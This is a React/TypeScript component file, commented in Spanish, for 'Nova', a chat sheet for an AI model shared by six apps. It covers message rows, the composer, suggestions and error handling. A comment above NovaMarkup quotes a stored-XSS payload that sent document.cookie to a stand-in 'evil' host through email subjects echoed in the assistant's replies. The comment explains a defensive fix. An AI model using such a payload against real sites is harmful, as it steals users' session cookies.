/**
 * Nova, la hoja del asistente, una sola para los seis productos (2026-10-06).
 * Antes cada app tenía la suya y había dos idiomas: la de Pulse en el mundo del
 * mapa y las otras cinco en shadcn, con el cuadro del color de cada app, tres
 * puntos que rebotaban y sugerencias en monoespaciada. La forma está aquí; cada
 * app pone sólo lo suyo: el saludo, las sugerencias, la que depende de lo que hay
 * abierto, la función que habla con su endpoint y lo que Nova nunca lee allí.
 *
 *   NovaSheet        la hoja entera: conversación, sugerencias y compositor
 *   NovaMessageRow   una fila: lo de Nova con su glifo, lo tuyo en una píldora
 *   NovaComposer     el campo que crece, con Enter para enviar
 *   NovaSuggestions  las preguntas de partida, como filas con icono
 *   NovaMarkup       la respuesta del modelo como nodos de React, nunca HTML
 *
 * Un solo color, el de Nova: la estrella de las seis luces (`NovaMark`) y su
 * aro, los mismos en todas partes, así que Nova no lleva el color de la app en
 * la que está.
 */
import { useLayoutEffect, useRef, useState, type ElementType, type ReactNode, type Ref } from "react";
import { ArrowUp, CircleAlert, MessageSquareText, RotateCcw } from "lucide-react";
import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "../ui/sheet";
import { textLinkClass } from "./console";
import { NovaMark } from "./nova-mark";

export interface NovaMessage {
	role: "user" | "assistant";
	content: string;
}

export interface NovaSuggestion {
	label: string;
	/** Lo que se manda de verdad al pulsarla; la fila lo enseña debajo del rótulo. */
	prompt: string;
	icon?: ElementType;
}

/**
 * Una vuelta de la conversación tal como se pinta: un fallo se ve, pero no se le
 * vuelve a mandar al modelo. Si el fallo llega a mitad de respuesta, `content`
 * conserva lo que ya había llegado y `error` va debajo.
 */
type Turn = NovaMessage & { failed?: boolean; error?: string };

// ─── el fallo, dicho en una frase ────────────────────────────────────────────

const UNREACHABLE = "Couldn't reach Nova. Check your connection and try again.";
const DOWN = "Nova couldn't be reached right now.";
const NO_ANSWER = "Nova didn't answer that one. Try asking again.";

/**
 * Lo que la hoja dice cuando algo falla, en una frase propia y nunca el cuerpo
 * crudo de la respuesta: el HTML de un 502 de la red de entrega, el JSON de un
 * error de la API (`{"error":"…"}` → ese campo) o el «Failed to fetch» de un
 * `fetch` sin red.
 */
export function novaErrorMessage(err: unknown): string {
	if (err instanceof DOMException && err.name === "AbortError") return "The answer was cut off. Try asking again.";
	const raw = err instanceof Error ? err.message : typeof err === "string" ? err : "";
	const text = raw.trim();
	if (!text) return NO_ANSWER;
	// Chrome, Safari y Firefox dicen tres cosas distintas para «no hay red».
	if (/failed to fetch|load failed|networkerror|network request failed/i.test(text)) return UNREACHABLE;
	if (/<!doctype|<html|<\/?(head|body|title|h1|center)\b/i.test(text)) return DOWN;
	const brace = text.indexOf("{");
	if (brace !== -1) {
		try {
			const json = JSON.parse(text.slice(brace)) as { error?: unknown; message?: unknown };
			const field = typeof json.error === "string" ? json.error : (json.error as { message?: unknown } | undefined)?.message ?? json.message;
			if (typeof field === "string" && field.trim()) return sentence(field.trim());
		} catch {
			/* no era JSON */
		}
		return DOWN;
	}
	// Un mensaje largo es el cuerpo de algo, no una frase para una persona.
	if (text.length > 200) return DOWN;
	return sentence(text);
}

function sentence(text: string): string {
	const first = text.charAt(0).toUpperCase() + text.slice(1);
	return /[.!?…]$/.test(first) ? first : `${first}.`;
}

// ─── el texto del modelo ─────────────────────────────────────────────────────

/**
 * Pinta la respuesta de Nova como nodos de React: `**bold**` pasa a <strong>, las
 * líneas que empiezan por «- », «* » o «1. » son una lista (los prompts de las
 * apps las permiten), un renglón en blanco separa párrafos y los saltos sueltos
 * los conserva `whitespace-pre-wrap`.
 *
 * Nada de `dangerouslySetInnerHTML`, que es lo que este componente sustituyó.
 *
 * La salida del asistente no es una entrada de confianza: le devuelve a quien
 * pregunta lo que el producto guarda, y mucho de eso lo escribió otra persona —
 * el asunto de un correo entrante, el nombre de un archivo subido, el título de
 * una reunión o de una tarea. Un asunto como
 * `<img src=x onerror="fetch('//evil/'+document.cookie)">` fue un XSS almacenado
 * que saltaba en cuanto alguien le pedía a Nova que listara los tickets abiertos,
 * y lo podía provocar cualquiera capaz de mandar un correo a un buzón vigilado.
 */
export function NovaMarkup({ text }: { text: string }) {
	return (
		<div className="flex flex-col gap-3">
			{blocks(text).map((block, i) =>
				block.kind === "text" ? (
					<p key={i} className="whitespace-pre-wrap">
						{formatBold(block.lines.join("\n"))}
					</p>
				) : (
					<ul key={i} className="flex flex-col gap-1.5">
						{block.items.map((item, j) => (
							<li key={j} className="flex gap-2.5">
								{block.ordered ? (
									<span className="min-w-[1.25em] shrink-0 text-(--sk-ink-3) tabular-nums" aria-hidden="true">
										{item.marker}
									</span>
								) : (
									<span className="mt-[0.68em] size-[5px] shrink-0 rounded-full bg-(--sk-ink-3)" aria-hidden="true" />
								)}
								<span className="min-w-0 whitespace-pre-wrap">{formatBold(item.text)}</span>
							</li>
						))}
					</ul>
				),
			)}
		</div>
	);
}

type Block = { kind: "text"; lines: string[] } | { kind: "list"; ordered: boolean; items: { marker: string; text: string }[] };

const BULLET = /^\s*[-*•]\s+(.*)$/;
const NUMBERED = /^\s*(\d{1,3})[.)]\s+(.*)$/;

/** Párrafos (separados por un renglón en blanco) y, dentro, tramos de texto o de lista. */
function blocks(text: string): Block[] {
	const out: Block[] = [];
	for (const paragraph of text.split(/\n[ \t]*\n/)) {
		let current: Block | null = null;
		for (const line of paragraph.split("\n")) {
			const bullet = BULLET.exec(line);
			const numbered = bullet ? null : NUMBERED.exec(line);
			if (bullet || numbered) {
				const ordered = Boolean(numbered);
				if (current?.kind !== "list" || current.ordered !== ordered) {
					current = { kind: "list", ordered, items: [] };
					out.push(current);
				}
				current.items.push(numbered ? { marker: `${numbered[1]}.`, text: numbered[2] } : { marker: "", text: bullet![1] });
			} else if (current?.kind === "list" && /^\s{2,}\S/.test(line)) {
				// Una línea sangrada bajo un punto sigue siendo ese punto.
				current.items[current.items.length - 1].text += `\n${line.trim()}`;
			} else {
				if (current?.kind !== "text") {
					current = { kind: "text", lines: [] };
					out.push(current);
				}
				current.lines.push(line);
			}
		}
	}
	return out.filter((b) => b.kind === "list" || b.lines.some((l) => l.trim() !== ""));
}

function formatBold(text: string): ReactNode[] {
	const nodes: ReactNode[] = [];
	// No voraz, sin anidamiento: un parser más pesado sería un segundo sitio donde
	// viviera la misma clase de bug.
	const pattern = /\*\*(.+?)\*\*/g;
	let lastIndex = 0;
	let match: RegExpExecArray | null;
	let key = 0;

	while ((match = pattern.exec(text)) !== null) {
		if (match.index > lastIndex) nodes.push(text.slice(lastIndex, match.index));
		nodes.push(<strong key={key++} className="font-semibold">{match[1]}</strong>);
		lastIndex = match.index + match[0].length;
	}
	if (lastIndex < text.length) nodes.push(text.slice(lastIndex));

	return nodes;
}

// ─── las piezas ──────────────────────────────────────────────────────────────

/**
 * El glifo de Nova: su estrella en un círculo blanco con el aro fino de las seis
 * luces, y el brillo latiendo mientras escribe. Si la vuelta falló, el círculo
 * rojo con la alerta.
 */
export function NovaGlyph({ size = "sm", failed = false, pending = false }: { size?: "sm" | "md"; failed?: boolean; pending?: boolean }) {
	const box = size === "md" ? "size-10" : "size-8";
	if (failed) {
		return (
			<span className={`inline-flex shrink-0 items-center justify-center rounded-full bg-[#fbeceb] text-[#b3261e] ${box}`} aria-hidden="true">
				<CircleAlert className={size === "md" ? "size-5" : "size-4"} strokeWidth={1.75} />
			</span>
		);
	}
	return (
		<span className={`sk-nova-ring sk-nova-ring--thin inline-flex shrink-0 items-center justify-center rounded-full ${box} ${pending ? "sk-nova-pulse" : ""}`} aria-hidden="true">
			<NovaMark size={size === "md" ? 22 : 18} />
		</span>
	);
}

/**
 * Una vuelta de la conversación. Lo que dice Nova es una fila con su glifo y el
 * texto a la medida de lectura; lo que dices tú, una píldora de niebla a la
 * derecha. `pending` es el hueco antes del primer token: una palabra que se
 * ilumina de lado a lado, quieta si se pide menos movimiento. `error` es el
 * fallo que cortó una respuesta a medias: el texto que llegó se queda y el fallo
 * va debajo, en rojo. `children` va debajo de todo (insertar en la respuesta,
 * reintentar).
 */
export function NovaMessageRow({
	role,
	content,
	pending = false,
	failed = false,
	error,
	children,
}: {
	role: NovaMessage["role"];
	content: string;
	pending?: boolean;
	failed?: boolean;
	error?: string;
	children?: ReactNode;
}) {
	if (role === "user") {
		return (
			<div className="flex justify-end pl-10">
				<p className="min-w-0 max-w-full whitespace-pre-wrap rounded-[18px] bg-(--sk-mist) px-4 py-2.5 text-[0.9375rem] leading-relaxed text-(--sk-ink) [overflow-wrap:anywhere]">
					{content}
				</p>
			</div>
		);
	}

	// Con una respuesta a medias el glifo sigue siendo el de Nova: lo que hay
	// encima del fallo es de Nova y se lee como tal.
	const partial = failed && Boolean(error);
	return (
		<div className="flex gap-3">
			<NovaGlyph failed={failed && !partial} pending={pending} />
			<div className="min-w-0 flex-1 pt-[0.3125rem]">
				{pending ? (
					<p className="sk-nova-writing text-[0.9375rem] leading-relaxed">Writing…</p>
				) : (
					<div
						className={`max-w-[62ch] text-[0.9375rem] leading-relaxed [overflow-wrap:anywhere] ${failed && !partial ? "text-(--sk-ink-2)" : "text-(--sk-ink)"}`}>
						<NovaMarkup text={content} />
					</div>
				)}
				{error && (
					<p className="mt-2.5 flex max-w-[62ch] items-start gap-1.5 text-[0.875rem] leading-snug text-[#a1221a]">
						<CircleAlert className="mt-0.5 size-3.5 shrink-0" strokeWidth={2} aria-hidden="true" />
						{error}
					</p>
				)}
				{children && <div className="mt-2.5 flex flex-wrap items-center gap-2">{children}</div>}
			</div>
		</div>
	);
}

/**
 * El campo de Nova: la píldora blanca del buscador de la barra, que crece con el
 * texto hasta cinco líneas y luego se desplaza. Enter envía y Shift+Enter parte
 * la línea, lo que ha enseñado todo cliente de chat; mientras se compone con un
 * método de entrada (japonés, chino…) Enter es de ese método, no de Nova.
 *
 * Sigue siendo editable mientras llega una respuesta: la siguiente pregunta se
 * puede ir tecleando, y es `onSubmit` quien decide si se manda ya.
 */
export function NovaComposer({
	value,
	onChange,
	onSubmit,
	busy = false,
	placeholder,
	label = "Ask Nova",
	inputRef,
}: {
	value: string;
	onChange: (value: string) => void;
	onSubmit: () => void;
	busy?: boolean;
	placeholder: string;
	/** Para el lector de pantalla. */
	label?: string;
	inputRef?: Ref<HTMLTextAreaElement>;
}) {
	const own = useRef<HTMLTextAreaElement | null>(null);
	const canSend = value.trim().length > 0 && !busy;

	// La altura sigue al valor y no a la tecla: así también vuelve a una línea
	// cuando el campo se vacía al enviar.
	useLayoutEffect(() => {
		const el = own.current;
		if (!el) return;
		el.style.height = "auto";
		el.style.height = `${el.scrollHeight}px`;
	}, [value]);

	return (
		<form
			className="sk-composer"
			onSubmit={(e) => {
				e.preventDefault();
				if (canSend) onSubmit();
			}}>
			<textarea
				ref={(el) => {
					own.current = el;
					if (typeof inputRef === "function") inputRef(el);
					else if (inputRef) inputRef.current = el;
				}}
				aria-label={label}
				placeholder={placeholder}
				rows={1}
				value={value}
				onChange={(e) => onChange(e.target.value)}
				onKeyDown={(e) => {
					if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) {
						e.preventDefault();
						if (canSend) onSubmit();
					}
				}}
			/>
			<button type="submit" className="sk-composer-send" disabled={!canSend} aria-label="Send" aria-busy={busy || undefined}>
				<ArrowUp className="size-4" strokeWidth={2} aria-hidden="true" />
			</button>
		</form>
	);
}

/**
 * Las preguntas de partida, como filas: el icono en su cuadro, el rótulo y,
 * debajo, lo que se va a mandar, para que nadie pulse a ciegas. La que depende
 * de lo que hay abierto (`scoped`) va primero y con el tinte del acento.
 */
export function NovaSuggestions({
	suggestions,
	scoped,
	onPick,
	disabled = false,
}: {
	suggestions: NovaSuggestion[];
	scoped?: NovaSuggestion;
	onPick: (prompt: string) => void;
	disabled?: boolean;
}) {
	const all: (NovaSuggestion & { scoped?: boolean })[] = scoped ? [{ ...scoped, scoped: true }, ...suggestions] : suggestions;
	if (all.length === 0) return null;
	return (
		<ul className="flex flex-col gap-0.5 rounded-[16px] bg-(--sk-surface) p-1 shadow-[inset_0_0_0_1px_var(--sk-hair)]" aria-label="Suggested questions">
			{all.map((s) => {
				const Icon = s.icon ?? MessageSquareText;
				const isScoped = Boolean(s.scoped);
				return (
					<li key={s.label}>
						<button
							type="button"
							disabled={disabled}
							// la pregunta entera, que la fila corta con puntos suspensivos
							title={s.prompt}
							onClick={() => onPick(s.prompt)}
							className="flex w-full items-center gap-3 rounded-[12px] px-2.5 py-2 text-left transition-colors duration-150 hover:bg-(--sk-ground) focus-visible:bg-(--sk-ground) focus-visible:outline-2 focus-visible:-outline-offset-2 focus-visible:outline-(--sk-accent) disabled:opacity-50">
							<span
								className={`inline-flex size-8 shrink-0 items-center justify-center rounded-[10px] ${isScoped ? "bg-[#e8effc] text-(--sk-accent)" : "bg-(--sk-ground) text-(--sk-ink-2)"}`}
								aria-hidden="true">
								<Icon className="size-4" strokeWidth={1.75} />
							</span>
							<span className="min-w-0 flex-1">
								<span className="block truncate text-[0.875rem] font-medium text-(--sk-ink)">{s.label}</span>
								<span className="block truncate text-[0.8125rem] text-(--sk-ink-3)">{s.prompt}</span>
							</span>
						</button>
					</li>
				);
			})}
		</ul>
	);
}

// ─── la hoja ─────────────────────────────────────────────────────────────────

/** Lo que el modelo ve de la conversación: sin el saludo, sin los fallos y sin la pregunta que los provocó. */
function conversation(turns: Turn[]): NovaMessage[] {
	// El saludo es nuestro, no parte de la conversación — devolverlo haría que
	// Nova contestara a su propia frase de apertura.
	const said = turns.slice(1);
	const out: NovaMessage[] = [];
	said.forEach((turn, i) => {
		if (turn.failed) return;
		if (turn.role === "user" && said[i + 1]?.failed) return;
		out.push({ role: turn.role, content: turn.content });
	});
	return out;
}

export interface NovaSheetProps {
	open: boolean;
	onOpenChange: (open: boolean) => void;
	title?: string;
	/** El alcance, dicho: «Scoped to what you can read in Harbour & Pine.» */
	description: ReactNode;
	/** Lo primero que dice Nova. Se pinta, pero nunca se le manda al modelo. */
	greeting: string;
	suggestions: NovaSuggestion[];
	/** La sugerencia que sólo tiene sentido con algo abierto (un canal, un documento). */
	scopedSuggestion?: NovaSuggestion;
	placeholder: string;
	/** Lo que Nova nunca lee en este producto, al pie del campo. */
	footnote: ReactNode;
	/** Habla con el endpoint de la app y llama a `onToken` con cada trozo; lanza si falla. */
	stream: (history: NovaMessage[], onToken: (token: string) => void) => Promise<void>;
	/** Acciones bajo una respuesta terminada (el «Insert into reply» de un ticket). */
	messageActions?: (message: NovaMessage, close: () => void) => ReactNode;
	/** Para el lector de pantalla, en el campo. */
	inputLabel?: string;
}

export interface NovaSheetFrameProps {
	open: boolean;
	onOpenChange: (open: boolean) => void;
	title: string;
	description: ReactNode;
	/** A la derecha del título (la «New chat» de Nova central). */
	headerAction?: ReactNode;
	busy: boolean;
	/** Cambia con cada cosa nueva en la conversación: si la vista estaba al final, se queda al final. */
	scrollKey: unknown;
	/** Las filas de la conversación y, si toca, las sugerencias. */
	children: ReactNode;
	composer: { value: string; onChange: (value: string) => void; onSubmit: () => void; placeholder: string; label?: string };
	footnote: ReactNode;
}

/**
 * La hoja de Nova sin la conversación: cabecera, registro desplazable, campo y
 * nota al pie. La comparten `NovaSheet` (cada app con su endpoint) y
 * `NovaChatSheet` (Nova central, components/nova-chat.tsx), así que se ven
 * idénticas. El desplazamiento se pega al final mientras escribe Nova, salvo si
 * has subido a leer.
 */
export function NovaSheetFrame({ open, onOpenChange, title, description, headerAction, busy, scrollKey, children, composer, footnote }: NovaSheetFrameProps) {
	const log = useRef<HTMLDivElement | null>(null);
	const input = useRef<HTMLTextAreaElement | null>(null);
	// Si la vista está al final. Leer una respuesta larga hacia arriba mientras
	// llega no debe devolverte abajo con cada token.
	const pinned = useRef(true);

	useLayoutEffect(() => {
		const el = log.current;
		if (el && pinned.current) el.scrollTop = el.scrollHeight;
	}, [scrollKey, open]);

	return (
		<Sheet open={open} onOpenChange={onOpenChange}>
			<SheetContent
				className="flex h-full w-full flex-col gap-0 p-0 max-sm:rounded-none! sm:max-w-[34rem]"
				onOpenAutoFocus={(e) => {
					// Con ratón, al campo directamente. En un teléfono no: el teclado
					// taparía las sugerencias antes de que nadie las lea.
					if (window.matchMedia("(pointer: fine)").matches) {
						e.preventDefault();
						input.current?.focus();
					}
				}}>
				<SheetHeader className="px-5 sm:px-6">
					<div className="flex items-center gap-3">
						<NovaGlyph size="md" />
						<div className="min-w-0 flex-1">
							<SheetTitle>{title}</SheetTitle>
							<SheetDescription className="text-[0.875rem] leading-snug">{description}</SheetDescription>
						</div>
						{headerAction}
					</div>
				</SheetHeader>

				<div
					ref={log}
					role="log"
					aria-live="polite"
					aria-busy={busy}
					aria-label="Conversation with Nova"
					onScroll={(e) => {
						const el = e.currentTarget;
						pinned.current = el.scrollHeight - el.scrollTop - el.clientHeight < 48;
					}}
					className="sk-nova-log flex flex-1 flex-col gap-5 overflow-y-auto overscroll-contain px-5 py-5 sm:px-6">
					{children}
				</div>

				<div className="border-t border-(--sk-hair) px-5 pb-5 pt-4 sm:px-6">
					<NovaComposer
						value={composer.value}
						onChange={composer.onChange}
						onSubmit={() => {
							pinned.current = true;
							composer.onSubmit();
						}}
						busy={busy}
						placeholder={composer.placeholder}
						label={composer.label}
						inputRef={input}
					/>
					<p className="sk-small mt-2.5 text-pretty px-1 leading-snug">{footnote}</p>
				</div>
			</SheetContent>
		</Sheet>
	);
}

/**
 * La hoja de Nova con el endpoint de cada app. Lleva ella la conversación: los
 * mensajes, el campo y el fallo. La conversación es de la pestaña: vive aquí,
 * sobrevive a cerrar y abrir la hoja y se pierde al recargar.
 */
export function NovaSheet({
	open,
	onOpenChange,
	title = "Nova",
	description,
	greeting,
	suggestions,
	scopedSuggestion,
	placeholder,
	footnote,
	stream,
	messageActions,
	inputLabel,
}: NovaSheetProps) {
	const [turns, setTurns] = useState<Turn[]>(() => [{ role: "assistant", content: greeting }]);
	const [draft, setDraft] = useState("");
	const [busy, setBusy] = useState(false);

	const close = () => onOpenChange(false);

	async function run(base: Turn[], prompt: string) {
		const history = [...conversation(base), { role: "user" as const, content: prompt }];
		setTurns([...base, { role: "user", content: prompt }, { role: "assistant", content: "" }]);
		setBusy(true);

		const settle = (turn: Turn) =>
			setTurns((prev) => {
				const next = [...prev];
				next[next.length - 1] = turn;
				return next;
			});

		let accumulated = "";
		try {
			await stream(history, (token) => {
				accumulated += token;
				settle({ role: "assistant", content: accumulated });
			});
			if (!accumulated.trim()) settle({ role: "assistant", content: NO_ANSWER, failed: true });
		} catch (err) {
			const message = novaErrorMessage(err);
			// Lo que ya había llegado se queda; el fallo va debajo.
			settle(accumulated.trim() ? { role: "assistant", content: accumulated, failed: true, error: message } : { role: "assistant", content: message, failed: true });
		} finally {
			setBusy(false);
		}
	}

	function send(text: string) {
		const prompt = text.trim();
		if (!prompt || busy) return false;
		void run(turns, prompt);
		return true;
	}

	/** Vuelve a hacer la última pregunta, quitando antes la pregunta y su fallo. */
	function retry() {
		const at = turns.length - 1;
		const asked = turns[at - 1];
		if (busy || !turns[at]?.failed || asked?.role !== "user") return;
		void run(turns.slice(0, at - 1), asked.content);
	}

	const last = turns.length - 1;

	return (
		<NovaSheetFrame
			open={open}
			onOpenChange={onOpenChange}
			title={title}
			description={description}
			busy={busy}
			scrollKey={turns}
			composer={{
				value: draft,
				onChange: setDraft,
				onSubmit: () => {
					if (send(draft)) setDraft("");
				},
				placeholder,
				label: inputLabel,
			}}
			footnote={footnote}>
			{turns.map((turn, i) => {
				const pending = busy && i === last && turn.role === "assistant" && turn.content === "";
				const streaming = busy && i === last;
				const done = turn.role === "assistant" && i > 0 && !turn.failed && !streaming && turn.content !== "";
				return (
					<NovaMessageRow key={i} role={turn.role} content={turn.content} pending={pending} failed={turn.failed} error={turn.error}>
						{turn.failed && i === last && !busy ? (
							<button type="button" className={`${textLinkClass} text-[0.875rem]`} onClick={retry}>
								<RotateCcw className="size-3.5" strokeWidth={1.75} aria-hidden="true" />
								Try again
							</button>
						) : done && messageActions ? (
							messageActions(turn, close)
						) : null}
					</NovaMessageRow>
				);
			})}

			{turns.length === 1 && (
				<div className="sm:pl-11">
					<NovaSuggestions suggestions={suggestions} scoped={scopedSuggestion} onPick={(p) => send(p)} disabled={busy} />
				</div>
			)}
		</NovaSheetFrame>
	);
}
